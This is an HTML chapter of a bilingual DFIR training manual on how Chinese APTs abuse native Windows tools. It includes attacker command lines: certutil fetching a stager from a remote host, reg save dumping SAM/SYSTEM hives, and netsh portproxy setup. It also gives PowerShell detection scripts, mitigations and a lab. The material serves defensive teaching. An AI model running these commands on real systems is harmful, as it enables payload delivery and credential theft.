@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cap. 30 — Hunting Chinese APTs (LOLBAS) | Ch. 30</title>
+<style>
+:root{--bg:#0d1117;--bg2:#161b22;--bg3:#1c2128;--fg:#c9d1d9;--fg2:#8b949e;--accent:#39d353;--accent2:#58a6ff;--warn:#d29922;--danger:#f85149;--border:#30363d;--code-bg:#0b0f14;--code-fg:#7ee787}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;line-height:1.65;font-size:16px}
+header{background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);border-bottom:2px solid var(--accent2);padding:2rem 1.5rem 1.5rem}
+header h1{margin:0 0 .3rem;font-size:1.9rem;color:var(--accent2)}
+header .sub{color:var(--fg2);font-size:.95rem}
+header .meta{margin-top:.8rem;font-size:.85rem;color:var(--fg2)}
+header .meta span{margin-right:1.2rem}
+nav.toc{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1rem 1.2rem;margin:1.5rem auto;max-width:1100px}
+nav.toc h2{margin:0 0 .6rem;font-size:1rem;color:var(--accent2);text-transform:uppercase;letter-spacing:.05em}
+nav.toc ol{margin:0;padding-left:1.3rem;columns:2;column-gap:2rem}
+nav.toc a{color:var(--fg);text-decoration:none}
+nav.toc a:hover{color:var(--accent2)}
+main{max-width:1100px;margin:0 auto;padding:0 1.5rem 3rem}
+section{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.4rem 1.6rem;margin:1.5rem 0}
+section h2{margin-top:0;color:var(--accent2);font-size:1.3rem;border-bottom:1px solid var(--border);padding-bottom:.5rem}
+section h3{color:var(--accent);font-size:1.05rem;margin-top:1.4rem}
+.lang{display:block;margin:.4rem 0}
+.lang .pt::before{content:"🇵🇹 PT ";color:var(--accent);font-weight:600;font-size:.8rem}
+.lang .en::before{content:"🇬🇧 EN ";color:var(--accent2);font-weight:600;font-size:.8rem}
+.lang .pt,.lang .en{display:block;margin:.25rem 0}
+pre{background:var(--code-bg);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:6px;padding:1rem 1.1rem;overflow-x:auto;font-family:"Cascadia Code","Fira Code",Consolas,monospace;font-size:.88rem;color:var(--code-fg);line-height:1.5}
+code.inline{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:.1rem .4rem;font-family:Consolas,monospace;font-size:.88rem;color:var(--accent)}
+table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.92rem}
+th,td{border:1px solid var(--border);padding:.55rem .7rem;text-align:left;vertical-align:top}
+th{background:var(--bg3);color:var(--accent2)}
+tr:nth-child(even) td{background:rgba(255,255,255,.02)}
+.callout{border-left:4px solid var(--warn);background:rgba(210,153,34,.08);padding:.8rem 1rem;border-radius:0 6px 6px 0;margin:1rem 0}
+.callout.danger{border-left-color:var(--danger);background:rgba(248,81,73,.08)}
+.callout.info{border-left-color:var(--accent2);background:rgba(88,166,255,.08)}
+.callout strong{color:var(--fg)}
+.badge{display:inline-block;font-size:.7rem;font-weight:700;letter-spacing:.05em;padding:.15rem .5rem;border-radius:999px;margin-left:.4rem;vertical-align:middle}
+.badge.orig{background:rgba(88,166,255,.15);color:var(--accent2);border:1px solid var(--accent2)}
+.badge.comp{background:rgba(57,211,83,.12);color:var(--accent);border:1px solid var(--accent)}
+.badge.impact{background:rgba(248,81,73,.12);color:var(--danger);border:1px solid var(--danger)}
+ul.checklist{list-style:none;padding-left:0}
+ul.checklist li::before{content:"☐ ";color:var(--accent);font-weight:700;margin-right:.3rem}
+footer{border-top:1px solid var(--border);margin-top:3rem;padding:1.5rem;text-align:center;color:var(--fg2);font-size:.85rem}
+footer a{color:var(--accent2);text-decoration:none}
+@media (max-width:720px){nav.toc ol{columns:1}header h1{font-size:1.4rem}}
+</style>
+</head>
+<body>
+<header>
+<h1>Cap. 30 — Hunting Chinese APTs (LOLBAS)</h1>
+<div class="sub">Ch. 30 — Native Windows Tools Abused by APTs</div>
+<div class="meta"><span>📖 Manual de Formação Ethical Hacker</span><span>🛡️ Nível: DFIR / Avançado</span></div>
+</header>
+<nav class="toc">
+<h2>Índice / Table of Contents</h2>
+<ol>
+<li><a href="#obj">Objetivos</a></li><li><a href="#ctx">Contexto</a></li>
+<li><a href="#certutil">Certutil</a></li><li><a href="#net">Net</a></li>
+<li><a href="#reg">Reg</a></li><li><a href="#netsh">Netsh</a></li>
+<li><a href="#dnscmd">Dnscmd</a></li><li><a href="#powershell">PowerShell</a></li>
+<li><a href="#impact">Scripts de Impacto</a></li><li><a href="#mitre">MITRE</a></li>
+<li><a href="#mitig">Mitigações</a></li><li><a href="#lab">Laboratório</a></li>
+<li><a href="#revq">Revisão</a></li><li><a href="#sum">Resumo</a></li>
+</ol>
+</nav>
+<main>
+
+<section id="obj">
+<h2>1. Objetivos de Aprendizagem / Learning Objectives</h2>
+<div class="lang">
+<span class="pt">Compreender o abuso de LOLBAS (Living Off the Land Binaries) por APTs chineses; conhecer os comandos específicos de <strong>Certutil</strong>, <strong>Net</strong>, <strong>Reg</strong>, <strong>Netsh</strong>, <strong>Dnscmd</strong> e <strong>PowerShell</strong>; mapear cada um para MITRE ATT&CK (T1218, T1059); detetar portproxy e enumeração DNS; <strong>construir scripts de impacto nativos</strong> para hunting.</span>
+<span class="en">Understand LOLBAS (Living Off the Land Binaries) abuse by Chinese APTs; know the specific commands for <strong>Certutil</strong>, <strong>Net</strong>, <strong>Reg</strong>, <strong>Netsh</strong>, <strong>Dnscmd</strong>, and <strong>PowerShell</strong>; map each to MITRE ATT&CK (T1218, T1059); detect portproxy and DNS enumeration; <strong>build native impact scripts</strong> for hunting.</span>
+</div>
+</section>
+
+<section id="ctx">
+<h2>2. Contexto e Relevância / Context and Relevance <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Os atores de ameaça modernos dependem cada vez mais de utilitários Windows confiáveis em vez de malware tradicional para evitar deteção em ambientes empresariais. Os binários nativos são assinados pela Microsoft, correm fora do contexto de aplicações não confiáveis, e misturam-se com atividade administrativa rotineira. Esta é a essência do LOLBAS (Living Off the Land Binaries and Scripts). APTs chineses, em particular, são conhecidos por usar estas ferramentas para reconhecimento, movimento lateral e exfiltração.</span>
+<span class="en">Modern threat actors increasingly rely on trusted Windows utilities instead of traditional malware to avoid detection inside enterprise environments. Native binaries are Microsoft-signed, run outside the context of untrusted applications, and blend with routine administrative activity. This is the essence of LOLBAS (Living Off the Land Binaries and Scripts). Chinese APTs, in particular, are known to use these tools for reconnaissance, lateral movement, and exfiltration.</span>
+</div>
+</section>
+
+<section id="certutil">
+<h2>3. Certutil — Download de Payloads <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O Certutil é uma das utilidades LOLBAS mais abusadas. Foi desenhada para gerir certificados, mas como suporta downloads de URLs remotas, os hackers usam-na para obter malware adicional de servidores C2. Grupos como o APT41 usaram Certutil logo após obter acesso, para descarregar um stager Cobalt Strike após um backdoor BEACON.</span>
+<span class="en">Certutil is one of the most commonly abused LOLBAS utilities. It was designed to manage certificates, but because it supports downloading files from remote URLs, hackers use it to retrieve additional malware from C2 servers. Groups like APT41 used Certutil shortly after gaining access, to download a Cobalt Strike stager after a BEACON backdoor.</span>
+</div>
+<pre>PS > certutil -urlcache -split -f http://192.168.56.106:443/stager.exe</pre>
+<div class="lang">
+<span class="pt">O parâmetro <code class="inline">-urlcache</code> ativa o cache de URL, <code class="inline">-split</code> divide o download, e <code class="inline">-f</code> força a sobrescrita. O ficheiro descarregado é depois executado para entregar shellcode.</span>
+<span class="en"><code class="inline">-urlcache</code> enables URL cache, <code class="inline">-split</code> splits the download, and <code class="inline">-f</code> forces overwrite. The downloaded file is then executed to deliver shellcode.</span>
+</div>
+</section>
+
+<section id="net">
+<h2>4. Net — Reconhecimento de Privilégios <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O comando <code class="inline">net</code> é uma ferramenta administrativa clássica para gerir contas, grupos e partilhas. Os hackers usam-no durante reconhecimento para compreender a estrutura de privilégios e identificar contas que podem conceder acesso elevado.</span>
+<span class="en">The <code class="inline">net</code> command is a classic administrative tool for managing accounts, groups, and shares. Hackers use it during reconnaissance to understand the privilege structure and identify accounts that may grant elevated access.</span>
+</div>
+<pre>PS > net localgroup administrators
+PS > net group /dom
+PS > net group "Domain Admins" /dom</pre>
+<div class="lang">
+<span class="pt">Estes comandos revelam que utilizadores pertencem a grupos administrativos críticos. Se os hackers descobrirem contas com privilégios elevados, podem tentar roubo de credenciais ou escalada de privilégios direcionada a esses utilizadores.</span>
+<span class="en">These commands reveal which users belong to critical administrative groups. If hackers discover accounts with elevated privileges, they may attempt credential theft or privilege escalation targeting those users.</span>
+</div>
+</section>
+
+<section id="reg">
+<h2>5. Reg — Extração de Credenciais e Hives <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O <code class="inline">reg</code> permite interagir diretamente com o registo Windows. Os atores de ameaça consultam localizações associadas a PuTTY, OpenSSH e RealVNC, porque estas ferramentas às vezes armazenam credenciais ou detalhes de conexão. Também guardam hives SAM e SYSTEM, que contêm hashes de password e chaves criptográficas para cracking offline.</span>
+<span class="en"><code class="inline">reg</code> allows direct interaction with the Windows registry. Threat actors query locations associated with PuTTY, OpenSSH, and RealVNC, because these tools sometimes store credentials or connection details. They also save SAM and SYSTEM hives, which contain password hashes and cryptographic keys for offline cracking.</span>
+</div>
+<pre>PS > reg.exe save hklm\sam C:\sam.save
+PS > reg.exe save hklm\system C:\system.save</pre>
+<div class="lang">
+<span class="pt">Estes ficheiros podem depois ser exfiltrados e processados com ferramentas como <code class="inline">secretsdump.py</code> para extrair hashes NTLM.</span>
+<span class="en">These files can then be exfiltrated and processed with tools like <code class="inline">secretsdump.py</code> to extract NTLM hashes.</span>
+</div>
+</section>
+
+<section id="netsh">
+<h2>6. Netsh — Portproxy e Recon de Firewall <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O <code class="inline">netsh</code> é uma ferramenta de rede poderosa. Os hackers usam-no para reconhecimento (regras de firewall, interfaces, rotas) e para modificar configurações de rede que suportam operações maliciosas. Uma das técnicas mais relevantes é a criação de <strong>portproxy</strong>, que transforma a vítima num proxy covert para movimento lateral.</span>
+<span class="en"><code class="inline">netsh</code> is a powerful network tool. Hackers use it for reconnaissance (firewall rules, interfaces, routes) and to modify network configurations that support malicious operations. One of the most relevant techniques is creating a <strong>portproxy</strong>, which turns the victim into a covert proxy for lateral movement.</span>
+</div>
+<h3>6.1 Recon</h3>
+<pre>PS > netsh interface portproxy show all
+PS > netsh advfirewall show allprofiles
+PS > netsh advfirewall firewall show rule name=all</pre>
+<h3>6.2 Criar Portproxy</h3>
+<pre>PS > cmd.exe /c netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=127.0.0.1 connectport=8443
+PS > cmd.exe /c netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=50100 connectaddress=127.0.0.1 connectport=1433</pre>
+<div class="lang">
+<span class="pt">Estas regras criam entradas de registo em <code class="inline">HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp\</code>. Rastrear que conta fez a alteração é crucial na investigação.</span>
+<span class="en">These rules create registry entries under <code class="inline">HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp\</code>. Tracking which account made the change is crucial during investigation.</span>
+</div>
+</section>
+
+<section id="dnscmd">
+<h2>7. Dnscmd — Enumeração de DNS <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O <code class="inline">dnscmd</code> gere servidores DNS Microsoft. Durante intrusões, os hackers usam-no para enumerar zonas e registos DNS, revelando informação valiosa sobre a infraestrutura interna e hostnames.</span>
+<span class="en"><code class="inline">dnscmd</code> manages Microsoft DNS servers. During intrusions, hackers use it to enumerate DNS zones and records, revealing valuable information about internal infrastructure and hostnames.</span>
+</div>
+<pre>PS > dnscmd . /enumrecords /zone {REDACTED}
+PS > dnscmd . /enumzones
+PS > dnscmd . /enumrecords {REDACTED} . /additional</pre>
+<div class="lang">
+<span class="pt">Estes comandos ajudam os atacantes a mapear a rede interna, identificar recursos de domínio e descobrir sistemas que podem ser alvos de movimento lateral.</span>
+<span class="en">These commands help attackers map the internal network, identify domain resources, and discover systems that may become targets for lateral movement.</span>
+</div>
+</section>
+
+<section id="powershell">
+<h2>8. PowerShell — Revisão de Logons <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O PowerShell é flexível e poderoso, e também é pesadamente abusado. O artigo documenta comandos usados para rever atividade de login num sistema comprometido.</span>
+<span class="en">PowerShell is flexible and powerful, and it's also heavily abused. The article documents commands used to review login activity on a compromised system.</span>
+</div>
+<pre>PS > Get-EventLog security -instanceid 4624
+PS > Get-EventLog -LogName System | Select-Object -Property UserName...</pre>
+<div class="lang">
+<span class="pt">O Event ID 4624 regista logons bem-sucedidos. Os atacantes usam-no para identificar contas ativas e planear movimento lateral.</span>
+<span class="en">Event ID 4624 logs successful logons. Attackers use it to identify active accounts and plan lateral movement.</span>
+</div>
+</section>
+
+<section id="impact">
+<h2>9. Scripts de Impacto / Impact Scripts <span class="badge impact">Impacto</span> <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">Os scripts abaixo ajudam o blue team a detetar a atividade LOLBAS descrita neste capítulo.</span>
+<span class="en">The scripts below help the blue team detect the LOLBAS activity described in this chapter.</span>
+</div>
+
+<h3>9.1 Script 30.1 — Deteção de Certutil Download / Certutil Download Detection</h3>
+<pre># Script 30.1 - Certutil Download Detection
+$out = ".\certutil-detect.csv"
+$hits = @()
+Get-WinEvent -LogName Security -MaxEvents 3000 -EA SilentlyContinue |
+  Where-Object { $_.Id -eq 4688 } | ForEach-Object {
+    $xml = [xml]$_.ToXml()
+    $cmd = ($xml.Event.EventData.Data | Where-Object Name -eq "CommandLine").'#text'
+    if ($cmd -match "certutil.*-urlcache" -or $cmd -match "certutil.*-split") {
+      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Command=$cmd }
+    }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Certutil downloads: $($hits.Count) -> $out" -ForegroundColor Red</pre>
+
+<h3>9.2 Script 30.2 — Deteção de Portproxy / Portproxy Detection</h3>
+<pre># Script 30.2 - Portproxy Detection
+$out = ".\portproxy-detect.csv"
+$key = "HKLM:\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp"
+$hits = @()
+if (Test-Path $key) {
+  Get-ChildItem $key | ForEach-Object {
+    $props = Get-ItemProperty $_.PSPath
+    $hits += [PSCustomObject]@{ Listen=$_.PSChildName; ConnectAddress=$props.ConnectAddress; ConnectPort=$props.ConnectPort }
+  }
+}
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Portproxy entries: $($hits.Count) -> $out" -ForegroundColor Red
+$hits | Format-Table -AutoSize</pre>
+
+<h3>9.3 Script 30.3 — Deteção de Dnscmd Enum / Dnscmd Enumeration Detection</h3>
+<pre># Script 30.3 - Dnscmd Enumeration Detection
+$out = ".\dnscmd-detect.csv"
+$hits = @()
+Get-WinEvent -LogName Security -MaxEvents 3000 -EA SilentlyContinue |
+  Where-Object { $_.Id -eq 4688 } | ForEach-Object {
+    $xml = [xml]$_.ToXml()
+    $cmd = ($xml.Event.EventData.Data | Where-Object Name -eq "CommandLine").'#text'
+    if ($cmd -match "dnscmd.*\/enum" -or $cmd -match "dnscmd.*\/zone") {
+      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Command=$cmd }
+    }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Dnscmd enumeration: $($hits.Count) -> $out" -ForegroundColor Yellow</pre>
+
+<h3>9.4 Script 30.4 — Deteção de Reg Save SAM/SYSTEM / Reg Save Detection</h3>
+<pre># Script 30.4 - Reg Save SAM/SYSTEM Detection
+$out = ".\regsave-detect.csv"
+$hits = @()
+Get-WinEvent -LogName Security -MaxEvents 3000 -EA SilentlyContinue |
+  Where-Object { $_.Id -eq 4688 } | ForEach-Object {
+    $xml = [xml]$_.ToXml()
+    $cmd = ($xml.Event.EventData.Data | Where-Object Name -eq "CommandLine").'#text'
+    if ($cmd -match "reg.*save.*hklm\\\\sam" -or $cmd -match "reg.*save.*hklm\\\\system") {
+      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Command=$cmd }
+    }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Reg save SAM/SYSTEM: $($hits.Count) -> $out" -ForegroundColor Red</pre>
+</section>
+
+<section id="mitre">
+<h2>10. Mapeamento MITRE ATT&amp;CK <span class="badge comp">Complementar</span></h2>
+<table>
+<tr><th>Técnica</th><th>ID</th><th>Onde</th></tr>
+<tr><td>System Binary Proxy Execution</td><td>T1218</td><td>Certutil, Netsh, Reg</td></tr>
+<tr><td>Command and Scripting Interpreter: PowerShell</td><td>T1059.001</td><td>PowerShell </td></tr>
+<tr><td>Command and Scripting Interpreter: Windows Command Shell</td><td>T1059.003</td><td>cmd.exe wrappers </td></tr>
+<tr><td>Ingress Tool Transfer</td><td>T1105</td><td>Certutil -urlcache</td></tr>
+<tr><td>OS Credential Dumping: Security Account Manager</td><td>T1003.002</td><td>reg save hklm\sam</td></tr>
+<tr><td>Remote System Discovery</td><td>T1018</td><td>dnscmd, netsh</td></tr>
+</table>
+</section>
+
+<section id="mitig">
+<h2>11. Mitigações Blue Team / Mitigations <span class="badge comp">Complementar</span></h2>
+<ol>
+<li><strong>Monitorizar Certutil com <code class="inline">-urlcache</code></strong> — Script 30.1.</li>
+<li><strong>Auditar PortProxy no registo</strong> — Script 30.2. Criar regra Sigma "Added Portproxy".</li>
+<li><strong>Monitorizar Dnscmd enum</strong> — Script 30.3.</li>
+<li><strong>Alertar sobre <code class="inline">reg save</code> de SAM/SYSTEM</strong> — Script 30.4.</li>
+<li><strong>Restringir LOLBAS via AppLocker/WDAC</strong> — bloquear Certutil, Dnscmd, Netsh se não forem necessários .</li>
+<li><strong>Privileged Account Management</strong> — limitar execução de binários vulneráveis a contas que precisam .</li>
+<li><strong>Honeytokens</strong> — entradas portproxy falsas, zonas DNS canário.</li>
+</ol>
+</section>
+
+<section id="lab">
+<h2>12. Exercício de Laboratório / Lab Exercise <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt"><strong>Cenário:</strong> VM Windows isolada com snapshot. Executar os comandos LOLBAS (simulados) e correr os scripts de deteção. <strong>Objetivo:</strong> compreender a técnica e validar deteções.</span>
+<span class="en"><strong>Scenario:</strong> Isolated Windows VM with snapshot. Run the LOLBAS commands (simulated) and run detection scripts. <strong>Goal:</strong> understand the technique and validate detections.</span>
+</div>
+<table>
+<tr><th>#</th><th>Tarefa</th><th>Comando</th><th>Evidência</th></tr>
+<tr><td>1</td><td>Certutil</td><td><code class="inline">certutil -urlcache -split -f http://KALI/test.exe</code></td><td><code class="inline">certutil-detect.csv</code></td></tr>
+<tr><td>2</td><td>Portproxy</td><td><code class="inline">netsh interface portproxy add ...</code></td><td><code class="inline">portproxy-detect.csv</code></td></tr>
+<tr><td>3</td><td>Dnscmd</td><td><code class="inline">dnscmd . /enumzones</code></td><td><code class="inline">dnscmd-detect.csv</code></td></tr>
+<tr><td>4</td><td>Reg save</td><td><code class="inline">reg save hklm\sam C:\sam.save</code></td><td><code class="inline">regsave-detect.csv</code></td></tr>
+<tr><td>5</td><td>Net</td><td><code class="inline">net group "Domain Admins" /dom</code></td><td>Output</td></tr>
+</table>
+<h3>Checklist de evidências / Evidence checklist</h3>
+<ul class="checklist">
+<li>Snapshot inicial</li>
+<li><code class="inline">certutil-detect.csv</code></li>
+<li><code class="inline">portproxy-detect.csv</code></li>
+<li><code class="inline">dnscmd-detect.csv</code></li>
+<li><code class="inline">regsave-detect.csv</code></li>
+<li>Snapshot final</li>
+</ul>
+</section>
+
+<section id="revq">
+<h2>13. Perguntas de Revisão / Review Questions <span class="badge comp">Complementar</span></h2>
+<ol>
+<li>Porque é que os APTs preferem LOLBAS a malware tradicional? / Why do APTs prefer LOLBAS to traditional malware?</li>
+<li>O que faz o <code class="inline">certutil -urlcache -split -f</code>? / What does <code class="inline">certutil -urlcache -split -f</code> do?</li>
+<li>Porque é que o <code class="inline">reg save hklm\sam</code> é perigoso? / Why is <code class="inline">reg save hklm\sam</code> dangerous?</li>
+<li>O que é um portproxy e porque é usado? / What is a portproxy and why is it used?</li>
+<li>O que revela o <code class="inline">dnscmd /enumrecords</code>? / What does <code class="inline">dnscmd /enumrecords</code> reveal?</li>
+<li>Como se deteta Certutil no blue team? / How to detect Certutil on the blue team?</li>
+<li>Porque é que o AppLocker/WDAC mitiga LOLBAS? / Why does AppLocker/WDAC mitigate LOLBAS? </li>
+</ol>
+</section>
+
+<section id="sum">
+<h2>14. Resumo do Capítulo / Chapter Summary</h2>
+<div class="lang">
+<span class="pt">Este capítulo cobriu o abuso de LOLBAS por APTs chineses: <strong>Certutil</strong> (download de payloads, T1105), <strong>Net</strong> (recon de privilégios), <strong>Reg</strong> (save de SAM/SYSTEM, T1003.002), <strong>Netsh</strong> (portproxy e recon de firewall), <strong>Dnscmd</strong> (enumeração DNS), e <strong>PowerShell</strong> (revisão de logons). A técnica central é <strong>T1218 — System Binary Proxy Execution</strong>, que permite contornar defesas baseadas em assinatura usando binários Microsoft assinados. Acrescentámos <strong>quatro scripts de impacto</strong> (deteção de Certutil, Portproxy, Dnscmd, Reg save) que ajudam o blue team a caçar esta atividade. O Cap. 31 entra na Consolidação Final.</span>
+<span class="en">This chapter covered LOLBAS abuse by Chinese APTs: <strong>Certutil</strong> (payload download, T1105), <strong>Net</strong> (privilege recon), <strong>Reg</strong> (SAM/SYSTEM save, T1003.002), <strong>Netsh</strong> (portproxy and firewall recon), <strong>Dnscmd</strong> (DNS enumeration), and <strong>PowerShell</strong> (logon review). The central technique is <strong>T1218 — System Binary Proxy Execution</strong>, which bypasses signature-based defenses using Microsoft-signed binaries. We added <strong>four impact scripts</strong> (Certutil, Portproxy, Dnscmd, Reg save detection) that help the blue team hunt this activity. Ch. 31 moves into Final Consolidation.</span>
+</div>
+</section>
+
+</main>
+<footer>
+<div>Manual de Formação Ethical Hacker — Cap. 30 / Ethical Hacker Training Manual — Ch. 30</div>
+<div style="margin-top:.6rem">
+<a href="cap29.html">← Cap. anterior / Previous</a> &nbsp;|&nbsp;
+<a href="#">Índice / Index</a> &nbsp;|&nbsp;
+<a href="cap31.html">Cap. seguinte / Next →</a>
+</div>
+</footer>
+</body>
+</html>
